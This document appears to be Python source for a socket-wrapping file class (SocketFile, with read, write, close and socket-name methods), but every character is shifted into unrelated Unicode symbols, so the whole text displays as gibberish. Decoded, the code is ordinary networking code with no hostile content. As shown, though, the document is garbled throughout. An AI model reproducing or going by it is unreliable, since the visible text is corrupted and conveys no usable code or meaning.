ꚫꚫꚫꚫꛪꛪꛬ꛷꛷ꛪꛪꚹꛬ꛻꛻꛰꛹ꛯꚳꚭ꛰꛽꛽꛺꛽ꛟꛬꛭꚭꚴꚕꚕꚕꛮ꛷ꛬ꛾꛾ꚫꛪꛒ꛴꜁꛰꜀꛻ꛚ꛹ꛞ꛰꛹ꛯ꛱꛴꛷꛰ꚳꛐ꜃ꛮ꛰꛻꛿꛴꛺꛹ꚴꛅꚫ꛻ꛬ꛾꛾ꚕꚕꚕꛮ꛷ꛬ꛾꛾ꚫ꛾꛺ꛮ꛶꛰꛿ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚴꛅꚕꚕꚫꚫꚫꚫꚭꚭꚭꛌꚫ꛾꜀ꛭꛮ꛷ꛬ꛾꛾ꚫ꛺꛱ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚫꛬꛯꛯ꛴꛹꛲ꚫ꛿꛳꛰ꚫ꛸ꛬ꛶꛰꛱꛴꛷꛰ꚳꚴꚫ꛸꛰꛿꛳꛺ꛯꚹꚭꚭꚭꚕꚕꚫꚫꚫꚫꛪꛪ꛾꛷꛺꛿꛾ꛪꛪꚫꛈꚫꛦꚭꛪꛪ꜂꛰ꛬ꛶꛽꛰꛱ꛪꛪꚭꚷꚫꚭꛪ꛴꛺ꛪ꛽꛰꛱꛾ꚭꚷꚫꚭꛪꛮ꛷꛺꛾꛰ꛯꚭꛨꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛴꛹꛴꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫ꛱ꛬ꛸꛴꛷꜄ꛈꚸꚼꚷꚫ꛿꜄꛻꛰ꛈꚸꚼꚷꚫ꛻꛽꛺꛿꛺ꛈꚸꚼꚷꚫ꛱꛴꛷꛰꛹꛺ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛑ꛺꛽ꚫ꜀꛾꛰꛽ꚫꛮ꛺ꛯ꛰ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛱ꛬ꛸꛴꛷꜄ꚫꛬ꛹ꛯꚫ꛿꜄꛻꛰ꚫ꜁ꛬ꛷꜀꛰꛾ꚫꛬ꛽꛰ꚫꛔ꛹꛿ꛐ꛹꜀꛸ꚫ꛸꛰꛸ꛭ꛰꛽꛾ꚷꚫꛭ꜀꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛱꛺꛽ꚫ꛿꛳꛰ꚫ꜀꛹ꛯ꛰꛽꛷꜄꛴꛹꛲ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚫ꛿꛳꛰꜄ꚲ꛽꛰ꚫ꛵꜀꛾꛿ꚫ꛴꛹꛿꛰꛲꛰꛽꛾ꚹꚫꛟ꛳꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛮ꛺꛹꛾꛿꛽꜀ꛮ꛿꛺꛽ꚫ꛺꛱ꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚫꛮ꛺꛹꜁꛰꛽꛿꛾ꚫ꛿꛳꛰ꚫ꛲꛴꜁꛰꛹ꚫꛬ꛽꛲꜀꛸꛰꛹꛿ꚫ꛿꛺ꚫꛬ꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛴꛹꛿꛰꛲꛰꛽ꚫꛬ꜀꛿꛺꛸ꛬ꛿꛴ꛮꛬ꛷꛷꜄ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛱꛴꛷꛰꛹꛺ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛱ꛬ꛸꛴꛷꜄ꚫꛈꛈꚫꚸꚼꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꛬ꛸꛴꛷꜄ꚫꛈꚫꛌꛑꛪꛔꛙꛐꛟꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꜄꛻꛰ꚫꛈꛈꚫꚸꚼꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꜄꛻꛰ꚫꛈꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛻꛽꛺꛿꛺ꚫꛈꛈꚫꚸꚼꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺ꚫꛈꚫꚻꚕꚫꚫꚫꚫꚫꚫꚫꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚹꛪꛪ꛴꛹꛴꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚷꚫ꛱꛴꛷꛰꛹꛺ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛴꛺ꛪ꛽꛰꛱꛾ꚫꛈꚫꚻꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛷꛺꛾꛰ꛯꚫꛈꚫꛑꛬ꛷꛾꛰ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛰꛹꛿꛰꛽ꛪꛪꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛰꜃꛴꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫꚵꛬ꛽꛲꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛾꛰꛷꛱ꚹꛪꛮ꛷꛺꛾꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛮ꛷꛺꛾꛰ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛽꛰꛻꛽ꛪꛪꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛢ꛽ꛬ꛻ꚫꛪꛪ꛽꛰꛻꛽ꛪꛪꚳꚴꚫ꛿꛺ꚫ꛽꛰꜁꛰ꛬ꛷ꚫ꛿꛳꛰ꚫ꛽꛰ꛬ꛷ꚫꛮ꛷ꛬ꛾꛾ꚫ꛹ꛬ꛸꛰ꚫꛬ꛹ꛯꚫ꛾꛺ꛮ꛶꛰꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬꛯꛯ꛽꛰꛾꛾ꚳ꛰꛾ꚴꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛷꛺꛾꛰ꛯꚫꛈꚫ꛲꛰꛿ꛬ꛿꛿꛽ꚳ꛾꛰꛷꛱ꚷꚫꚲꛪꛮ꛷꛺꛾꛰ꛯꚲꚷꚫꛑꛬ꛷꛾꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾ꚫꛈꚫꚭꛇꚰ꛾ꚹꚰ꛾ꚰ꛾ꚫ꛱ꛯꛈꚰ꛴ꚷꚫ꛱ꛬ꛸꛴꛷꜄ꛈꚰ꛾ꚷꚫ꛿꜄꛻꛰ꛈꚰ꛾ꚷꚫ꛻꛽꛺꛿꛺ꛈꚰ꛴ꚭꚫꛧꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚰꚫꚳ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚹꛪꛪ꛸꛺ꛯ꜀꛷꛰ꛪꛪꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚹꛪꛪ꛼꜀ꛬ꛷꛹ꛬ꛸꛰ꛪꛪꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꚫꛦꛮ꛷꛺꛾꛰ꛯꛨꚭꚫ꛴꛱ꚫꛮ꛷꛺꛾꛰ꛯꚫ꛰꛷꛾꛰ꚫꚭꚭꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛱ꛬ꛸꛴꛷꜄ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛿꜄꛻꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛻꛽꛺꛿꛺ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛮ꛷꛺꛾꛰ꛯꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛲꛰꛿꛾꛺ꛮ꛶꛹ꛬ꛸꛰ꚫꛬ꛹ꛯꚫ꛲꛰꛿꛻꛰꛰꛽꛹ꛬ꛸꛰ꚫ꛸ꛬ꜄ꚫ꛹꛺꛿ꚫꛭ꛰ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚫ꛺꛹ꚫꛢꛌꛞꛔꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛷ꛬꛯꛯ꛽ꚫꛈꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿꛾꛺ꛮ꛶꛹ꛬ꛸꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛷ꛬꛯꛯ꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾ꚫꚶꛈꚫꚭꚷꚫ꛷ꛬꛯꛯ꛽ꛈꚰ꛾ꚭꚫꚰꚫ꛾꛿꛽ꚳ꛷ꛬꛯꛯ꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꚳ꛰꛽꛽꛺꛽ꚷꚫꛌ꛿꛿꛽꛴ꛭ꜀꛿꛰ꛐ꛽꛽꛺꛽ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬꛯꛯ꛽ꚫꛈꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿꛻꛰꛰꛽꛹ꛬ꛸꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛽ꛬꛯꛯ꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾ꚫꚶꛈꚫꚭꚷꚫ꛽ꛬꛯꛯ꛽ꛈꚰ꛾ꚭꚫꚰꚫ꛾꛿꛽ꚳ꛽ꛬꛯꛯ꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꚳ꛰꛽꛽꛺꛽ꚷꚫꛌ꛿꛿꛽꛴ꛭ꜀꛿꛰ꛐ꛽꛽꛺꛽ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾ꚫꚶꛈꚫꚲꛉꚲꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛲꛰꛿꛾꛿ꛬ꛿꛰ꛪꛪꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꜄꛻꛰ꛐ꛽꛽꛺꛽ꚳ꛱ꚭꛮꛬ꛹꛹꛺꛿ꚫ꛻꛴ꛮ꛶꛷꛰ꚫ꜆꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚹꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚬ꛽꜈ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚭꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛯ꜀꛻ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛯ꜀꛻ꚳꚴꚫꚸꛉꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛏ꜀꛻꛷꛴ꛮꛬ꛿꛰ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚫꛝ꛰꛿꜀꛽꛹ꚫꛬꚫ꛹꛰꜂ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫ꛿꛺ꚫ꛿꛳꛰ꚫ꛾ꛬ꛸꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜄꛾꛿꛰꛸ꚫ꛽꛰꛾꛺꜀꛽ꛮ꛰ꚹꚫꛟ꛳꛰ꚫ꛹꛰꜂ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚫ꛹꛺꛹ꚸ꛴꛹꛳꛰꛽꛴꛿ꛬꛭ꛷꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꛯꚫꛈꚫꛯ꜀꛻ꚳ꛾꛰꛷꛱ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚫꛈꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚳ꛾꛰꛷꛱ꚹ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛾꛰꛷꛱ꚹ꛿꜄꛻꛰ꚷꚫ꛾꛰꛷꛱ꚹ꛻꛽꛺꛿꛺ꚷꚫ꛱꛴꛷꛰꛹꛺ꛈ꛱ꛯꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛾꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳ꛾꛰꛷꛱ꚹ꛲꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛺ꛮ꛶ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛬꛮꛮ꛰꛻꛿ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛬꛮꛮ꛰꛻꛿ꚳꚴꚫꚸꛉꚫꚳ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚷꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛴꛹꛱꛺ꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛢꛬ꛴꛿ꚫ꛱꛺꛽ꚫꛬ꛹ꚫ꛴꛹ꛮ꛺꛸꛴꛹꛲ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚹꚫꚫꛝ꛰꛿꜀꛽꛹ꚫꛬꚫ꛹꛰꜂ꚫ꛾꛺ꛮ꛶꛰꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛻꛽꛰꛾꛰꛹꛿꛴꛹꛲ꚫ꛿꛳꛰ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚷꚫꛬ꛹ꛯꚫ꛿꛳꛰ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛺꛱ꚫ꛿꛳꛰ꚫꛮ꛷꛴꛰꛹꛿ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛑ꛺꛽ꚫꛔꛛꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚷꚫ꛿꛳꛰ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛴꛹꛱꛺ꚫ꛴꛾ꚫꛬꚫ꛻ꛬ꛴꛽ꚫꚳ꛳꛺꛾꛿ꛬꛯꛯ꛽ꚷꚫ꛻꛺꛽꛿ꚴꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꛯꚷꚫꛬꛯꛯ꛽ꚫꛈꚫ꛾꛰꛷꛱ꚹꛪꛬꛮꛮ꛰꛻꛿ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚫꛈꚫ꛾꛺ꛮ꛶꛰꛿ꚳ꛾꛰꛷꛱ꚹ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛾꛰꛷꛱ꚹ꛿꜄꛻꛰ꚷꚫ꛾꛰꛷꛱ꚹ꛻꛽꛺꛿꛺ꚷꚫ꛱꛴꛷꛰꛹꛺ꛈ꛱ꛯꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛔ꛾꛾꜀꛰ꚫꚮꛂꛄꛄꛀꛅꚫ꛴꛱ꚫ꛹꛺ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫ꛴꛾ꚫ꛾꛰꛿ꚫꛬ꛹ꛯꚫ꛿꛳꛰ꚫ꛷꛴꛾꛿꛰꛹꛴꛹꛲ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛳ꛬꛯꚫꛬꚫꚳ꛹꛺꛹ꚸ꜅꛰꛽꛺ꚴꚫ꛿꛴꛸꛰꛺꜀꛿ꚷꚫ꛱꛺꛽ꛮ꛰ꚫ꛿꛳꛰ꚫ꛹꛰꜂ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛹ꚫꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛸꛺ꛯ꛰ꚫ꛿꛺ꚫ꛺꜁꛰꛽꛽꛴ꛯ꛰ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚸ꛾꛻꛰ꛮ꛴꛱꛴ꛮꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛱꛷ꛬ꛲꛾ꚫ꛴꛹꛳꛰꛽꛴꛿ꛬ꛹ꛮ꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛲꛰꛿ꛯ꛰꛱ꛬ꜀꛷꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꚫ꛴꛾ꚫꛙ꛺꛹꛰ꚫꛬ꛹ꛯꚫ꛾꛰꛷꛱ꚹ꛲꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛾꛰꛿ꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚳꛟ꛽꜀꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛺ꛮ꛶ꚷꚫꛬꛯꛯ꛽ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛸ꛬ꛶꛰꛱꛴꛷꛰ꚳ꛾꛰꛷꛱ꚷꚫ꛸꛺ꛯ꛰ꛈꚭ꛽ꚭꚷꚫꛭ꜀꛱꛱꛰꛽꛴꛹꛲ꛈꛙ꛺꛹꛰ꚷꚫꚵꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꛈꛙ꛺꛹꛰ꚷꚫ꛰꛽꛽꛺꛽꛾ꛈꛙ꛺꛹꛰ꚷꚫ꛹꛰꜂꛷꛴꛹꛰ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭ꛸ꛬ꛶꛰꛱꛴꛷꛰ꚳꚹꚹꚹꚴꚫꚸꛉꚫꛬ꛹ꚫꛔꚺꛚꚫ꛾꛿꛽꛰ꛬ꛸ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫ꛿꛺ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛟ꛳꛰ꚫꛬ꛽꛲꜀꛸꛰꛹꛿꛾ꚫꛬ꛽꛰ꚫꛬ꛾ꚫ꛱꛺꛽ꚫ꛴꛺ꚹ꛺꛻꛰꛹ꚳꚴꚫꛬ꛱꛿꛰꛽ꚫ꛿꛳꛰ꚫ꛱꛴꛷꛰꛹ꛬ꛸꛰ꚷꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛿꛳꛰ꚫ꛺꛹꛷꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫ꛸꛺ꛯ꛰ꚫ꜁ꛬ꛷꜀꛰꛾ꚫꛬ꛽꛰ꚫꚲ꛽ꚲꚫꚳꛯ꛰꛱ꛬ꜀꛷꛿ꚴꚷꚫꚲ꜂ꚲꚫꛬ꛹ꛯꚫꚲꛭꚲꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛣꛣꛣꚫ꛽꛰꛱ꛬꛮ꛿꛺꛽ꚫ꛿꛺ꚫ꛾꛳ꛬ꛽꛰ꚫꛮ꛺ꛯ꛰ꛊꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛾꛰꛿ꚳ꛸꛺ꛯ꛰ꚴꚫꛇꛈꚫ꜆ꚭ꛽ꚭꚷꚫꚭ꜂ꚭꚷꚫꚭꛭꚭ꜈ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛴꛹꜁ꛬ꛷꛴ꛯꚫ꛸꛺ꛯ꛰ꚫꚰ꛽ꚫꚳ꛺꛹꛷꜄ꚫ꛽ꚷꚫ꜂ꚷꚫꛭꚫꛬ꛷꛷꛺꜂꛰ꛯꚴꚭꚫꚰꚫꚳ꛸꛺ꛯ꛰ꚷꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛽꛴꛿꛴꛹꛲ꚫꛈꚫꚭ꜂ꚭꚫ꛴꛹ꚫ꛸꛺ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰ꛬꛯ꛴꛹꛲ꚫꛈꚫꚭ꛽ꚭꚫ꛴꛹ꚫ꛸꛺ꛯ꛰ꚫ꛺꛽ꚫ꛹꛺꛿ꚫ꜂꛽꛴꛿꛴꛹꛲ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛾꛾꛰꛽꛿ꚫ꛽꛰ꛬꛯ꛴꛹꛲ꚫ꛺꛽ꚫ꜂꛽꛴꛿꛴꛹꛲ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛭ꛴꛹ꛬ꛽꜄ꚫꛈꚫꚭꛭꚭꚫ꛴꛹ꚫ꛸꛺ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꜂꛸꛺ꛯ꛰ꚫꛈꚫꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛽꛰ꛬꛯ꛴꛹꛲ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꜂꛸꛺ꛯ꛰ꚫꚶꛈꚫꚭ꛽ꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꜂꛽꛴꛿꛴꛹꛲ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꜂꛸꛺ꛯ꛰ꚫꚶꛈꚫꚭ꜂ꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꜂ꚫꛈꚫꛞ꛺ꛮ꛶꛰꛿ꛔꛚꚳ꛾꛰꛷꛱ꚷꚫ꛽ꛬ꜂꛸꛺ꛯ꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛴꛺ꛪ꛽꛰꛱꛾ꚫꚶꛈꚫꚼꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꜀꛱꛱꛰꛽꛴꛹꛲ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꜀꛱꛱꛰꛽꛴꛹꛲ꚫꛈꚫꚸꚼꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꜀꛱꛱꛰꛽꛴꛹꛲ꚫꛇꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꜀꛱꛱꛰꛽꛴꛹꛲ꚫꛈꚫ꛴꛺ꚹꛏꛐꛑꛌꛠꛗꛟꛪꛍꛠꛑꛑꛐꛝꛪꛞꛔꛥꛐꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꜀꛱꛱꛰꛽꛴꛹꛲ꚫꛈꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛭ꛴꛹ꛬ꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꜀꛹ꛭ꜀꛱꛱꛰꛽꛰ꛯꚫ꛾꛿꛽꛰ꛬ꛸꛾ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫꛭ꛴꛹ꛬ꛽꜄ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛽ꛬ꜂ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛽꛰ꛬꛯ꛴꛹꛲ꚫꛬ꛹ꛯꚫ꜂꛽꛴꛿꛴꛹꛲ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꜀꛱꛱꛰꛽ꚫꛈꚫ꛴꛺ꚹꛍ꜀꛱꛱꛰꛽꛰ꛯꛝꛢꛛꛬ꛴꛽ꚳ꛽ꛬ꜂ꚷꚫ꛽ꛬ꜂ꚷꚫꛭ꜀꛱꛱꛰꛽꛴꛹꛲ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛴꛱ꚫ꛽꛰ꛬꛯ꛴꛹꛲ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭ꜀꛱꛱꛰꛽ꚫꛈꚫ꛴꛺ꚹꛍ꜀꛱꛱꛰꛽꛰ꛯꛝ꛰ꛬꛯ꛰꛽ꚳ꛽ꛬ꜂ꚷꚫꛭ꜀꛱꛱꛰꛽꛴꛹꛲ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛾꛾꛰꛽꛿ꚫ꜂꛽꛴꛿꛴꛹꛲ꚕꚫꚫ